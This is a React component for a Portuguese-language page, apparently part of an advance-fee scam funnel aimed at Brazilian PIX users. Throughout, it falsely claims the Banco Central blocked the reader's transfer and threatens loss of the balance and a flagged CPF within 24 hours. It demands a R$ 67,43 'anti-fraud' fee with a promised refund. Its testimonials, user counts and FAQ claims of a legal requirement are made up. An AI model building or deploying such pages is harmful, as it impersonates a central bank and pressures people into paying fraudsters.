import { useState } from "react";
import { Loader2, ChevronDown, ChevronUp } from "lucide-react";
import StickyCtaBar from "./StickyCtaBar";
import pixLogo from "@/assets/pix-logo.svg";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";

interface FunnelUpsellAntiFraudeProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }

const TestimonialCard = ({ avatar, name, location, time, text, amount }: { avatar: string; name: string; location: string; time: string; text: string; amount: string }) => (
  <div className="bg-white rounded-xl p-3 shadow-sm border border-gray-50">
    <div className="flex items-center gap-2 mb-2"><img src={avatar} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location} • {time}</p></div><span className="text-[#00A651] text-[10px] font-bold bg-green-50 px-2 py-0.5 rounded-full">+{amount}</span></div>
    <p className="text-gray-600 text-[11px] leading-relaxed">"{text}"</p>
    <div className="flex gap-0.5 mt-1.5">{[...Array(5)].map((_, i) => <span key={i} className="text-yellow-400 text-[10px]">★</span>)}</div>
  </div>
);

const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
  const [open, setOpen] = useState(false);
  return (
    <div className="bg-white rounded-xl shadow-sm border border-gray-50 overflow-hidden">
      <button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>
      {open && <div className="px-3 pb-3"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}
    </div>
  );
};

const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiFraudeProps) => {
  const firstName = leadName ? leadName.split(" ")[0] : "";
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
      <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">⚠️ TRANSFERÊNCIA BLOQUEADA PELO BACEN</h1></div>
      <main className="px-3 py-4 max-w-lg mx-auto pb-24">
        {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-red-50 border border-red-300 rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">⛔</span><div><p className="text-red-700 text-xs font-bold mb-1">{firstName ? `${firstName.toUpperCase()}, SEU SALDO SERÁ CANCELADO EM 24H` : "SALDO SERÁ CANCELADO EM 24H"}</p><p className="text-red-600 text-[11px] leading-relaxed">O <span className="font-bold">Banco Central</span> bloqueou {firstName ? <>a transferência de <strong>{firstName}</strong> no valor de</> : <>sua transferência de</>} <span className="font-bold">{balance}</span> por suspeita de fraude. Sem a verificação anti-fraude, o valor será <strong>devolvido ao remetente e {firstName ? `${firstName} perde` : "você perde"} o saldo permanentemente</strong>.</p></div></div></div>
        <div className="bg-red-50/50 rounded-xl p-4 mb-3 border border-red-200"><p className="text-red-700 text-xs font-bold mb-2">🚨 Sem a verificação anti-fraude:</p><div className="space-y-1.5"><p className="text-red-600 text-[11px]">❌ Saldo de <strong>{balance} CANCELADO</strong> permanentemente</p><p className="text-red-600 text-[11px]">❌ CPF <strong>marcado como suspeito</strong> no sistema DICT/BACEN</p><p className="text-red-600 text-[11px]">❌ <strong>Impossível recuperar</strong> o valor após cancelamento</p><p className="text-red-600 text-[11px]">❌ Futuras transferências PIX <strong>bloqueadas por até 180 dias</strong></p></div></div>
        <div className="bg-green-50 rounded-xl p-4 mb-3 border border-green-200"><p className="text-green-700 text-xs font-bold mb-2">✅ Com a verificação anti-fraude:</p><div className="space-y-1.5"><p className="text-green-700 text-[11px]">✓ Saldo de <strong>{balance} liberado em até 3 minutos</strong></p><p className="text-green-700 text-[11px]">✓ CPF <strong>limpo e verificado</strong> no sistema BACEN</p><p className="text-green-700 text-[11px]">✓ Taxa de R$ 67,43 <strong>reembolsada automaticamente em 2 min</strong></p><p className="text-green-700 text-[11px]">✓ Proteção total contra <strong>fraudes e clonagem de PIX</strong></p></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm">
          <div className="flex justify-center mb-3"><div className="w-14 h-14"><img src={pixLogo} alt="PIX" className="w-full h-full object-contain" /></div></div>
          <div className="flex justify-center mb-3"><span className="bg-red-100 text-red-700 text-[10px] font-bold px-3 py-1 rounded-full animate-pulse">⚠️ BLOQUEIO ATIVO — AÇÃO IMEDIATA</span></div>
          <div className="bg-gray-50 rounded-lg p-3 mb-2 border border-gray-100"><div className="flex justify-between items-center mb-1"><span className="text-gray-500 text-[11px]">Tarifa anti-fraude:</span><span className="text-gray-900 text-sm font-bold">R$ 67,43</span></div><div className="flex justify-between items-center"><span className="text-gray-500 text-[11px]">Reembolso:</span><span className="text-[#00A651] text-[11px] font-semibold">Automático em até 2 min</span></div></div>
          <p className="text-red-500 text-[10px] font-semibold text-center mb-3">❌ {firstName ? `${firstName}, sem` : "Sem"} verificação = perda total de {balance}</p>
          <div className="flex items-center justify-center gap-1 mt-3"><span className="text-[10px] text-gray-400">🔐 Pagamento seguro via PIX</span><span className="text-gray-300 text-[10px]">•</span><span className="text-[10px] text-gray-400">Reembolso garantido</span></div>
        </div>
        <div className="bg-white rounded-xl p-3 mt-3 shadow-sm"><p className="text-gray-500 text-[11px] text-center leading-relaxed"><span className="font-bold text-gray-700">12.847 pessoas</span> já verificaram e receberam o saldo nos últimos 7 dias.</p></div>
        <div className="mt-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="Por que preciso pagar essa tarifa?" answer="O protocolo DICT do Banco Central EXIGE a verificação anti-fraude para qualquer movimentação acima de R$ 2.000. Sem ela, o sistema cancela a transferência permanentemente em 24 horas. Não é opcional — é uma exigência legal." /><FaqItem question="Vou receber o reembolso da tarifa?" answer="Sim, 100% garantido. O valor de R$ 67,43 retorna automaticamente em até 2 minutos após a verificação. Você recebe o reembolso + seu saldo completo. Risco zero." /><FaqItem question="O que acontece se eu NÃO pagar?" answer="Seu saldo será CANCELADO permanentemente em 24 horas. O valor será devolvido ao remetente, seu CPF será marcado como suspeito no BACEN e você ficará impedido de receber transferências PIX por até 180 dias." /><FaqItem question="É seguro pagar via PIX?" answer="Totalmente seguro. O PIX é regulamentado pelo Banco Central do Brasil com criptografia de ponta a ponta." /><FaqItem question="Quanto tempo leva para receber meu saldo?" answer="Após o pagamento da tarifa, a liberação é INSTANTÂNEA. Em média, o PIX cai em menos de 3 minutos." /></div></div>
        <div className="mt-3 space-y-2.5"><p className="text-gray-600 text-xs font-bold text-center">Quem já recebeu:</p><TestimonialCard avatar={testimonial1} name="Mariana S." location="São Paulo, SP" time="há 12 min" text="Eu achei que era golpe, mas paguei a tarifa e em menos de 2 minutos o PIX de R$ 3.241,00 caiu na minha conta." amount="R$ 3.241,00" /><TestimonialCard avatar={testimonial2} name="Carlos A." location="Belo Horizonte, MG" time="há 38 min" text="Fiquei com medo no início, mas vi que era protocolo do Banco Central mesmo. Paguei e recebi meu saldo inteiro." amount="R$ 2.876,50" /><TestimonialCard avatar={testimonial3} name="Fernanda L." location="Rio de Janeiro, RJ" time="há 1h" text="Quase desisti achando que ia perder dinheiro. Mas a tarifa voltou certinho e meu saldo caiu rapidinho." amount="R$ 2.654,30" /></div>
        <p className="text-gray-400 text-[10px] text-center mt-4 pb-6">© 2025 Sistema de Verificação Bancária. Protocolo DICT/BACEN.</p>
      </main>
      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={firstName ? `${firstName.toUpperCase()}, LIBERAR MEU SALDO` : "LIBERAR MEU SALDO AGORA"} bgColor="bg-[#00A651]" shadowColor="shadow-green-200" />
    </div>
  );
};

export default FunnelUpsellAntiFraude;
